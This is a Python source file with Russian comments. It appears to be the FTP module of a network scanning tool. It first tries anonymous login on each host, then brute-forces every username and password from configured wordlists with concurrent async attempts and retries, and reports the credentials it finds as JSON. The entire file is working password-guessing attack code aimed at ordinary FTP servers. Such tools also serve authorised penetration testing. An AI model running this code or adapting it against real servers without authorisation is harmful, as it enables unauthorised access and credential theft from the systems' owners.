import asyncio
from asyncio import Semaphore
import aioftp
from lib.config_reader import threads_count, passwords, users
from lib.progress_bar import ScanState
from lib.nmap import base32_decode

# Инициализация состояния сканирования
scan_state_ftp = ScanState()

# Ограничение количества одновременных задач
MAX_CONCURRENT_TASKS = threads_count
semaphore = Semaphore(MAX_CONCURRENT_TASKS)
found = asyncio.Event()  # Флаг для остановки при успешном входе

# Класс для хранения найденного пароля
class Good_Pass:
    def __init__(self):
        self.username = None
        self.password = None

    def set_credentials(self, username, password):
        self.username = username
        self.password = password

true_credentials = None

# Класс для путей к спискам
class Paths:
    def __init__(self, passwords_path=passwords, usernames_path=users):
        self.usernames = usernames_path
        self.passwords = passwords_path

get_path = Paths()

# Загрузка списков пользователей и паролей
def get_list_from_file(path):
    with open(path, 'r', encoding="utf-8", errors="replace") as file:
        return [line.strip() for line in file if line.strip()]

password_list = get_list_from_file(get_path.passwords)
username_list = get_list_from_file(get_path.usernames)

# Формирование JSON-ответа
def help_json(user_pass):
    data_list = []
    for username, password in user_pass:
        data = {
            "username": username,
            "password": password
        }
        data_list.append(data)
    return data_list

def create_json(input_data):
    data_list = []
    for arm in input_data:
        data = {
            "id": arm[0],
            "users": help_json(arm[1])
        }
        data_list.append(data)
    return data_list

# Проверка анонимного входа
async def check_anonymous_login(host, port=21):
    async with semaphore:
        try:
            async with aioftp.Client.context(host, port, user="anonymous", password="anonymous") as client:
                print(f"[+] Anonymous login successful on {host}:{port}")
                scan_state_ftp.next()
                return True, "anonymous", "anonymous"
        except Exception as e:
            print(f"[-] Anonymous login failed on {host}:{port} - {e}")
            scan_state_ftp.next()
            return False, None, None

# Брутфорс FTP
async def ftp_bruteforce(host, username, password, port=21, retry=3):
    async with semaphore:
        print(f"[DEBUG] Attempting {username}:{password} on {host}:{port}")
        for attempt in range(retry):
            try:
                # Используем asyncio.wait_for для таймаута
                async with aioftp.Client.context(host, port, user=username, password=password) as client:
                    print(f"[+] FTP login successful on {host}:{port} with username {username} and password {password}")
                    scan_state_ftp.next()
                    return True, username, password
            except asyncio.TimeoutError:
                print(f"[-] Timeout for {username}:{password} on {host}:{port} ({attempt+1}/{retry})")
                await asyncio.sleep(1)
            except Exception as e:
                print(f"[-] FTP login failed for {username}:{password} on {host}:{port} ({attempt+1}/{retry}) - {e}")
                await asyncio.sleep(1)
        scan_state_ftp.next()
        print(f"[DEBUG] Failed all attempts for {username}:{password} on {host}:{port}")
        return False, None, None

async def start_scan(host, port=21, anonymous_checked=False, anon_user=None, anon_pass=None):
    global true_credentials
    true_credentials = Good_Pass()
    tasks = set()
    result = []  # Список для хранения всех результатов (включая анонимный)

    # Добавляем анонимный доступ в результаты, если он уже проверен и успешен
    if anonymous_checked and anon_user and anon_pass:
        result.append([anon_user, anon_pass])
        true_credentials.set_credentials(anon_user, anon_pass)

    # Проверка на пустые списки
    if not username_list or not password_list:
        print("[-] Username or password list is empty.")
        return result

    print(f"[DEBUG] Starting brute force for {host}:{port} with {len(username_list)} users and {len(password_list)} passwords")
    # Брутфорс
    for username in username_list:
        for password in password_list:
            task = asyncio.create_task(
                asyncio.wait_for(
                    ftp_bruteforce(host, username, password, port),
                    timeout=10.0  # Таймаут 10 секунд для каждой задачи
                )
            )
            tasks.add(task)
            if len(tasks) >= MAX_CONCURRENT_TASKS:
                done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for task in done:
                    try:
                        success, user, pwd = task.result()
                        if success:
                            print(f"[DEBUG] Adding successful credentials {user}:{pwd} to result")
                            result.append([user, pwd])
                            true_credentials.set_credentials(user, pwd)
                    except asyncio.TimeoutError:
                        print(f"[DEBUG] Task timed out for {host}:{port}")
                    except Exception as e:
                        print(f"[DEBUG] Task failed for {host}:{port} - {e}")

    # Завершаем все оставшиеся задачи
    if tasks:
        done, _ = await asyncio.wait(tasks)
        for task in done:
            try:
                success, user, pwd = task.result()
                if success:
                    print(f"[DEBUG] Adding successful credentials {user}:{pwd} to result")
                    result.append([user, pwd])
                    true_credentials.set_credentials(user, pwd)
            except asyncio.TimeoutError:
                print(f"[DEBUG] Task timed out for {host}:{port}")
            except Exception as e:
                print(f"[DEBUG] Task failed for {host}:{port} - {e}")

    print("[+] FTP brute force completed")
    found.clear()
    text = f"[?] Credentials: {true_credentials.username}:{true_credentials.password}"
    if true_credentials.username and true_credentials.password:
        print("\033[32m{}\033[0m".format(text))
    else:
        print("\033[38;5;208m{}\033[0m".format(text))
    print(f"[DEBUG] Final result for {host}:{port}: {result}")
    return result

async def initiation_scan(hosts_ip, port=21):
    scan_state_ftp.total = (len(password_list) * len(username_list) + 1) * len(hosts_ip)  # +1 для анонимного входа
    if scan_state_ftp.total == 0:
        print("[-] No tasks to process (empty hosts or lists).")
        return create_json([])
    scan_state_ftp.is_scanning = True
    scan_state_ftp.progress = 0
    print(f"[*] Total tasks: {scan_state_ftp.total}")
    main_res = []
    for host_ip in hosts_ip:
        host = base32_decode(host_ip)
        print(f"[*] Scanning {host}:{port}")
        result = []
        # Проверка анонимного входа
        success, anon_user, anon_pass = await check_anonymous_login(host, port)
        # Вызываем start_scan с результатами проверки анонимного входа
        brute_results = await start_scan(host, port, anonymous_checked=success, anon_user=anon_user, anon_pass=anon_pass)
        result.extend(brute_results)
        main_res.append([host_ip, result])
    scan_state_ftp.is_scanning = False
    return create_json(main_res)